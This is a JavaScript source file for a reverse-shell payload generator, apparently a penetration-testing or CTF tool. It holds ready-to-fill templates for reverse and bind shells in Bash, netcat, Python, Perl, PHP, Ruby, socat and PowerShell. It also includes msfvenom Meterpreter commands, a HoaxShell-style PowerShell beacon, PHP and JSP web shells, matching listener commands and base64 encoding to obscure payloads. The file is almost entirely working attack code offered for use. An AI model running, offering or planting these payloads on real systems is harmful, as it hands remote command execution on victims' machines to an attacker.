(function (root, factory) {
  var api = factory();
  if (typeof module === "object" && module.exports) {
    module.exports = api;
  }
  root.RevShells = api;
})(typeof window !== "undefined" ? window : globalThis, function () {
  "use strict";

  var STORAGE_KEY = "security-buffor:revshells";

  var payloads = [
    {
      id: "bash-tcp",
      name: "Bash TCP",
      type: "reverse",
      os: ["linux", "mac"],
      shell: "/bin/bash",
      template: "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
      listener: "nc",
    },
    {
      id: "bash-readline",
      name: "Bash read line",
      type: "reverse",
      os: ["linux", "mac"],
      shell: "/bin/bash",
      shellOptions: ["/bin/bash", "/bin/sh", "/bin/zsh"],
      template:
        "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
      listener: "nc",
    },
    {
      id: "sh-tcp",
      name: "POSIX sh TCP",
      type: "reverse",
      os: ["linux", "mac"],
      shell: "/bin/sh",
      template: "sh -i >& /dev/tcp/{ip}/{port} 0>&1",
      listener: "nc",
    },
    {
      id: "nc-mkfifo",
      name: "Netcat mkfifo",
      type: "reverse",
      os: ["linux", "mac"],
      shell: "/bin/sh",
      shellOptions: ["/bin/sh", "/bin/bash", "/bin/dash", "/bin/ash"],
      template:
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
      listener: "nc",
    },
    {
      id: "nc-openbsd",
      name: "Netcat OpenBSD",
      type: "reverse",
      os: ["linux", "mac"],
      shell: "/bin/sh",
      shellOptions: ["/bin/sh", "/bin/bash", "/bin/dash", "/bin/ash"],
      template: "nc {ip} {port} -e {shell}",
      listener: "nc",
    },
    {
      id: "busybox-nc",
      name: "BusyBox nc",
      type: "reverse",
      os: ["linux"],
      shell: "/bin/sh",
      shellOptions: ["/bin/sh", "/bin/ash", "/bin/bash"],
      template: "busybox nc {ip} {port} -e {shell}",
      listener: "nc",
    },
    {
      id: "python3",
      name: "Python3",
      type: "reverse",
      os: ["linux", "mac"],
      shell: "/bin/sh",
      shellOptions: ["/bin/sh", "/bin/bash", "/bin/zsh"],
      template:
        "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
      listener: "nc",
    },
    {
      id: "python2",
      name: "Python2",
      type: "reverse",
      os: ["linux", "mac"],
      shell: "/bin/sh",
      shellOptions: ["/bin/sh", "/bin/bash", "/bin/zsh"],
      template:
        "python -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
      listener: "nc",
    },
    {
      id: "perl",
      name: "Perl",
      type: "reverse",
      os: ["linux", "mac"],
      shell: "/bin/sh",
      shellOptions: ["/bin/sh", "/bin/bash", "/bin/zsh"],
      template:
        "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
      listener: "nc",
    },
    {
      id: "php",
      name: "PHP",
      type: "reverse",
      os: ["linux", "mac"],
      shell: "/bin/sh",
      shellOptions: ["/bin/sh", "/bin/bash", "/bin/zsh"],
      template:
        "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} -i <&3 >&3 2>&3\");'",
      listener: "nc",
    },
    {
      id: "ruby",
      name: "Ruby",
      type: "reverse",
      os: ["linux", "mac"],
      shell: "/bin/sh",
      shellOptions: ["/bin/sh", "/bin/bash", "/bin/zsh"],
      template:
        "ruby -rsocket -e 'spawn(\"{shell}\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
      listener: "nc",
    },
    {
      id: "socat",
      name: "Socat TTY",
      type: "reverse",
      os: ["linux", "mac"],
      shell: "/bin/bash",
      shellOptions: ["/bin/bash", "/bin/sh", "/bin/zsh"],
      template:
        "socat TCP:{ip}:{port} EXEC:'{shell} -li',pty,stderr,setsid,sigint,sane",
      listener: "socat",
    },
    {
      id: "powershell-tcp",
      name: "PowerShell TCP",
      type: "reverse",
      os: ["windows"],
      shell: "powershell.exe",
      template:
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
      listener: "nc",
    },
    {
      id: "cmd-nc",
      name: "Windows nc.exe",
      type: "reverse",
      os: ["windows"],
      shell: "cmd.exe",
      template: "nc.exe {ip} {port} -e cmd.exe",
      listener: "nc",
    },
    {
      id: "bind-nc-linux",
      name: "Netcat bind shell",
      type: "bind",
      os: ["linux", "mac"],
      shell: "/bin/sh",
      shellOptions: ["/bin/sh", "/bin/bash", "/bin/dash", "/bin/ash"],
      template: "nc -lvnp {port} -e {shell}",
      listener: "nc-bind",
    },
    {
      id: "bind-socat",
      name: "Socat bind TTY",
      type: "bind",
      os: ["linux", "mac"],
      shell: "/bin/bash",
      shellOptions: ["/bin/bash", "/bin/sh", "/bin/zsh"],
      template:
        "socat TCP-LISTEN:{port},reuseaddr,fork EXEC:'{shell} -li',pty,stderr,setsid,sigint,sane",
      listener: "socat-bind",
    },
    {
      id: "msf-linux-x64",
      name: "Linux x64 Meterpreter",
      type: "msfvenom",
      os: ["linux"],
      shell: "linux/x64/meterpreter/reverse_tcp",
      template:
        "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o {name}",
      listener: "msfconsole",
    },
    {
      id: "msf-windows-x64",
      name: "Windows x64 Meterpreter",
      type: "msfvenom",
      os: ["windows"],
      shell: "windows/x64/meterpreter/reverse_tcp",
      template:
        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o {name}",
      listener: "msfconsole",
    },
    {
      id: "msf-php",
      name: "PHP meterpreter",
      type: "msfvenom",
      os: ["linux", "windows"],
      shell: "php/meterpreter/reverse_tcp",
      template:
        "msfvenom -p php/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw -o {name}",
      listener: "msfconsole",
    },
    {
      id: "hoaxshell",
      name: "HoaxShell PowerShell",
      type: "hoaxshell",
      os: ["windows"],
      shell: "powershell.exe",
      template:
        "powershell -e {base64}",
      base64Template:
        "$s='{ip}:{port}';$i='{session}';while($true){$r=irm http://$s/$i;if($r){$o=iex $r 2>&1|Out-String;iwr http://$s/$i -Method POST -Body $o};sleep 1}",
      listener: "hoaxshell",
    },
    {
      id: "php-web",
      name: "PHP web shell",
      type: "assembled",
      os: ["linux", "windows"],
      shell: "php",
      template: "<?php system($_REQUEST['cmd'] ?? 'id'); ?>",
      listener: "none",
    },
    {
      id: "jsp-web",
      name: "JSP command shell",
      type: "assembled",
      os: ["linux", "windows"],
      shell: "jsp",
      template:
        "<% if (request.getParameter(\"cmd\") != null) { String[] c = {\"/bin/sh\", \"-c\", request.getParameter(\"cmd\")}; java.io.InputStream in = Runtime.getRuntime().exec(c).getInputStream(); int a; while((a=in.read())!=-1) out.print((char)a); } %>",
      listener: "none",
    },
  ];

  var listeners = {
    nc: "nc -lvnp {port}",
    "nc-bind": "nc {ip} {port}",
    socat:
      "socat file:`tty`,raw,echo=0 TCP-LISTEN:{port},reuseaddr",
    "socat-bind": "socat file:`tty`,raw,echo=0 TCP:{ip}:{port}",
    msfconsole:
      "msfconsole -q -x 'use exploit/multi/handler; set payload {shell}; set LHOST {ip}; set LPORT {port}; run'",
    hoaxshell: "python3 -m http.server {port}",
    none: "No listener required for this payload.",
  };

  var platforms = ["linux", "windows", "mac"];
  var payloadTypeOrder = ["reverse", "bind", "msfvenom", "hoaxshell", "assembled"];

  function getDefaultState() {
    return {
      ip: "10.10.14.3",
      port: "4444",
      shell: "",
      name: "payload.bin",
      session: "lair",
      type: "reverse",
      os: "linux",
      encoding: "none",
      payloadId: "bash-tcp",
      query: "",
    };
  }

  function escapeRegExp(value) {
    return String(value).replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  }

  function renderTemplate(template, state) {
    var values = Object.assign({}, getDefaultState(), state || {});
    var output = String(template || "");

    if (output.indexOf("{base64}") !== -1 && values.base64Template) {
      values.base64 = encodeValue(renderTemplate(values.base64Template, values), "base64");
    }

    Object.keys(values).forEach(function (key) {
      if (values[key] == null || typeof values[key] === "object") return;
      output = output.replace(
        new RegExp("\\{" + escapeRegExp(key) + "\\}", "g"),
        String(values[key])
      );
    });

    return output;
  }

  function encodeValue(value, encoding) {
    var text = String(value || "");
    if (encoding === "url") return encodeURIComponent(text);
    if (encoding === "double-url") return encodeURIComponent(encodeURIComponent(text));
    if (encoding === "base64") {
      if (typeof btoa === "function") {
        return btoa(unescape(encodeURIComponent(text)));
      }
      return Buffer.from(text, "utf8").toString("base64");
    }
    return text;
  }

  function filterPayloads(filters) {
    var next = Object.assign({ os: "linux", type: "reverse", query: "" }, filters || {});
    var query = String(next.query || "").trim().toLowerCase();

    return payloads.filter(function (payload) {
      var matchesType = !next.type || payload.type === next.type;
      var matchesOs = payload.os.indexOf(next.os) !== -1;
      var haystack = [payload.name, payload.id, payload.type, payload.shell]
        .join(" ")
        .toLowerCase();
      return matchesType && matchesOs && (!query || haystack.indexOf(query) !== -1);
    });
  }

  function findPayload(id) {
    return payloads.find(function (payload) {
      return payload.id === id;
    }) || payloads[0];
  }

  function getPayloadTypesForOs(os) {
    var platform = platforms.indexOf(os) === -1 ? getDefaultState().os : os;
    return payloadTypeOrder.filter(function (type) {
      return payloads.some(function (payload) {
        return payload.type === type && payload.os.indexOf(platform) !== -1;
      });
    });
  }

  function normalizeWorkflowState(state) {
    var next = Object.assign({}, getDefaultState(), state || {});
    if (platforms.indexOf(next.os) === -1) next.os = getDefaultState().os;

    var validTypes = getPayloadTypesForOs(next.os);
    if (validTypes.indexOf(next.type) === -1) {
      next.type = validTypes[0] || "reverse";
    }

    var available = filterPayloads({
      os: next.os,
      type: next.type,
      query: next.query || "",
    });
    var selectedIsAvailable = available.some(function (payload) {
      return payload.id === next.payloadId;
    });
    if (!selectedIsAvailable) {
      next.payloadId = available[0] ? available[0].id : "";
    }

    return {
      os: next.os,
      type: next.type,
      payloadId: next.payloadId,
    };
  }

  function payloadUsesField(payloadOrId, field) {
    var payload =
      typeof payloadOrId === "string" ? findPayload(payloadOrId) : payloadOrId;
    if (!payload || !field) return false;
    var token = "{" + field + "}";
    return [payload.template, payload.base64Template]
      .filter(Boolean)
      .some(function (template) {
        return String(template).indexOf(token) !== -1;
      });
  }

  function getPayloadShellOptions(payloadOrId) {
    var payload =
      typeof payloadOrId === "string" ? findPayload(payloadOrId) : payloadOrId;
    if (!payload || !payloadUsesField(payload, "shell")) return [];
    var options = payload.shellOptions || [payload.shell].filter(Boolean);
    return options.map(function (value) {
      return { value: value, label: value };
    });
  }

  function payloadNeedsField(payloadOrId, field) {
    var payload =
      typeof payloadOrId === "string" ? findPayload(payloadOrId) : payloadOrId;
    if (!payload || !field) return false;
    if (field === "name") {
      return payloadUsesField(payload, "name") || payload.type === "msfvenom";
    }
    if (field === "session") {
      return payloadUsesField(payload, "session") || payload.type === "hoaxshell";
    }
    return payloadUsesField(payload, field);
  }

  function normalizeStateForPayload(state, payloadOrId) {
    var payload =
      typeof payloadOrId === "string" ? findPayload(payloadOrId) : payloadOrId;
    var next = Object.assign({}, getDefaultState(), state || {});
    if (!payload) return next;

    var shellOptions = getPayloadShellOptions(payload);
    if (shellOptions.length) {
      var validShell = shellOptions.some(function (option) {
        return option.value === next.shell;
      });
      if (!validShell) next.shell = shellOptions[0].value;
    } else if (payload.listener === "msfconsole") {
      next.shell = payload.shell || "";
    } else {
      next.shell = "";
    }

    if (!payloadNeedsField(payload, "name")) next.name = getDefaultState().name;
    if (!payloadNeedsField(payload, "session")) next.session = getDefaultState().session;
    return next;
  }

  function renderPayload(payloadOrId, state) {
    var payload =
      typeof payloadOrId === "string" ? findPayload(payloadOrId) : payloadOrId;
    var nextState = normalizeStateForPayload(
      Object.assign({}, getDefaultState(), payload || {}, state || {}),
      payload
    );
    if (payload && payload.base64Template) {
      nextState.base64Template = payload.base64Template;
    }
    var raw = renderTemplate(payload ? payload.template : "", nextState);
    return encodeValue(raw, nextState.encoding);
  }

  function renderListener(listenerId, state) {
    var template = listeners[listenerId] || listeners.nc;
    return renderTemplate(template, state);
  }

  function loadState() {
    if (typeof localStorage === "undefined") return getDefaultState();
    try {
      return Object.assign(
        {},
        getDefaultState(),
        JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}")
      );
    } catch (error) {
      return getDefaultState();
    }
  }

  function saveState(state) {
    if (typeof localStorage === "undefined") return;
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
    } catch (error) {}
  }

  function setText(element, value) {
    if (element) element.textContent = value;
  }

  function copyText(text, fallbackElement, statusElement) {
    function done(message) {
      setText(statusElement, message);
      if (statusElement) {
        window.clearTimeout(statusElement._timer);
        statusElement._timer = window.setTimeout(function () {
          setText(statusElement, "");
        }, 1800);
      }
    }

    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(
        function () {
          done("Copied");
        },
        function () {
          done("Copy failed");
        }
      );
      return;
    }

    if (fallbackElement && typeof fallbackElement.select === "function") {
      fallbackElement.focus();
      fallbackElement.select();
      done("Selected");
      return;
    }

    done("Copy unavailable");
  }

  function downloadText(filename, text) {
    var blob = new Blob([text], { type: "text/plain;charset=utf-8" });
    var url = URL.createObjectURL(blob);
    var link = document.createElement("a");
    link.href = url;
    link.download = filename || "payload.txt";
    document.body.appendChild(link);
    link.click();
    link.remove();
    URL.revokeObjectURL(url);
  }

  function initApp() {
    var app = document.querySelector("[data-revshells-app]");
    if (!app) return;

    var state = loadState();
    var fields = {
      ip: app.querySelector("[data-rs-field='ip']"),
      port: app.querySelector("[data-rs-field='port']"),
      shell: app.querySelector("[data-rs-field='shell']"),
      name: app.querySelector("[data-rs-field='name']"),
      session: app.querySelector("[data-rs-field='session']"),
      encoding: app.querySelector("[data-rs-field='encoding']"),
      query: app.querySelector("[data-rs-field='query']"),
      payloadId: app.querySelector("[data-rs-field='payloadId']"),
    };
    var payloadOutput = app.querySelector("[data-rs-output='payload']");
    var listenerOutput = app.querySelector("[data-rs-output='listener']");
    var rawOutput = app.querySelector("[data-rs-output='raw']");
    var meta = app.querySelector("[data-rs-meta]");
    var status = app.querySelector("[data-rs-status]");
    var optionRows = {
      shell: app.querySelector("[data-rs-option='shell']"),
      name: app.querySelector("[data-rs-option='name']"),
      session: app.querySelector("[data-rs-option='session']"),
    };
    var optionsPanel = app.querySelector("[data-rs-options]");
    var typeButtons = Array.prototype.slice.call(app.querySelectorAll("[data-rs-type]"));
    var osButtons = Array.prototype.slice.call(app.querySelectorAll("[data-rs-os]"));

    function syncFields() {
      Object.keys(fields).forEach(function (key) {
        if (fields[key] && fields[key].value !== state[key]) {
          fields[key].value = state[key] || "";
        }
      });
      typeButtons.forEach(function (button) {
        var active = button.getAttribute("data-rs-type") === state.type;
        button.classList.toggle("is-active", active);
        button.setAttribute("aria-pressed", active ? "true" : "false");
        button.hidden =
          getPayloadTypesForOs(state.os).indexOf(button.getAttribute("data-rs-type")) === -1;
      });
      osButtons.forEach(function (button) {
        var active = button.getAttribute("data-rs-os") === state.os;
        button.classList.toggle("is-active", active);
        button.setAttribute("aria-pressed", active ? "true" : "false");
      });
    }

    function getSelectedPayload(available) {
      var selected = findPayload(state.payloadId);
      if (available.some(function (payload) { return payload.id === selected.id; })) {
        return selected;
      }
      return available[0] || payloads[0];
    }

    function updatePayloadOptions(selected) {
      var shellOptions = getPayloadShellOptions(selected);
      if (fields.shell) {
        fields.shell.innerHTML = "";
        shellOptions.forEach(function (shellOption) {
          var option = document.createElement("option");
          option.value = shellOption.value;
          option.textContent = shellOption.label;
          fields.shell.appendChild(option);
        });
      }

      if (optionRows.shell) {
        optionRows.shell.hidden = shellOptions.length === 0;
      }
      if (optionRows.name) {
        optionRows.name.hidden = !payloadNeedsField(selected, "name");
      }
      if (optionRows.session) {
        optionRows.session.hidden = !payloadNeedsField(selected, "session");
      }
      if (optionsPanel) {
        optionsPanel.hidden =
          shellOptions.length === 0 &&
          !payloadNeedsField(selected, "name") &&
          !payloadNeedsField(selected, "session");
      }
    }

    function render() {
      var workflow = normalizeWorkflowState(state);
      state.os = workflow.os;
      state.type = workflow.type;
      state.payloadId = workflow.payloadId;

      var available = filterPayloads(state);
      var selected = getSelectedPayload(available);
      state.payloadId = selected.id;
      state = normalizeStateForPayload(state, selected);
      state.payloadId = selected.id;

      if (fields.payloadId) {
        fields.payloadId.innerHTML = "";
        available.forEach(function (payload) {
          var option = document.createElement("option");
          option.value = payload.id;
          option.textContent = payload.name;
          fields.payloadId.appendChild(option);
        });
      }

      updatePayloadOptions(selected);
      syncFields();

      var renderState = Object.assign({}, selected, state);
      var raw = renderTemplate(selected.template, renderState);
      var encoded = encodeValue(raw, state.encoding);
      var listener = renderListener(selected.listener, renderState);

      if (payloadOutput) payloadOutput.value = encoded;
      if (listenerOutput) listenerOutput.value = listener;
      if (rawOutput) rawOutput.value = raw;
      setText(
        meta,
        available.length + " payloads matched / selected " + selected.name
      );
      saveState(state);
    }

    Object.keys(fields).forEach(function (key) {
      var field = fields[key];
      if (!field) return;
      field.addEventListener("input", function () {
        state[key] = field.value;
        render();
      });
      field.addEventListener("change", function () {
        state[key] = field.value;
        render();
      });
    });

    typeButtons.forEach(function (button) {
      button.addEventListener("click", function () {
        state.type = button.getAttribute("data-rs-type");
        render();
      });
    });

    osButtons.forEach(function (button) {
      button.addEventListener("click", function () {
        state.os = button.getAttribute("data-rs-os");
        state.query = "";
        render();
      });
    });

    app.addEventListener("click", function (event) {
      var target = event.target.closest("[data-rs-action]");
      if (!target) return;
      var action = target.getAttribute("data-rs-action");

      if (action === "increment-port") {
        state.port = String((parseInt(state.port, 10) || 0) + 1);
        render();
      }

      if (action === "reset") {
        state = getDefaultState();
        render();
      }

      if (action === "copy-payload") {
        copyText(payloadOutput.value, payloadOutput, status);
      }

      if (action === "copy-listener") {
        copyText(listenerOutput.value, listenerOutput, status);
      }

      if (action === "copy-raw") {
        copyText(rawOutput.value, rawOutput, status);
      }

      if (action === "download") {
        downloadText(state.name || "payload.txt", rawOutput.value);
        setText(status, "Downloaded");
      }
    });

    render();
  }

  if (typeof document !== "undefined") {
    document.addEventListener("DOMContentLoaded", initApp);
  }

  return {
    payloads: payloads,
    listeners: listeners,
    getDefaultState: getDefaultState,
    renderTemplate: renderTemplate,
    encodeValue: encodeValue,
    filterPayloads: filterPayloads,
    findPayload: findPayload,
    payloadUsesField: payloadUsesField,
    getPayloadShellOptions: getPayloadShellOptions,
    payloadNeedsField: payloadNeedsField,
    normalizeStateForPayload: normalizeStateForPayload,
    getPayloadTypesForOs: getPayloadTypesForOs,
    normalizeWorkflowState: normalizeWorkflowState,
    renderPayload: renderPayload,
    renderListener: renderListener,
    initApp: initApp,
  };
});
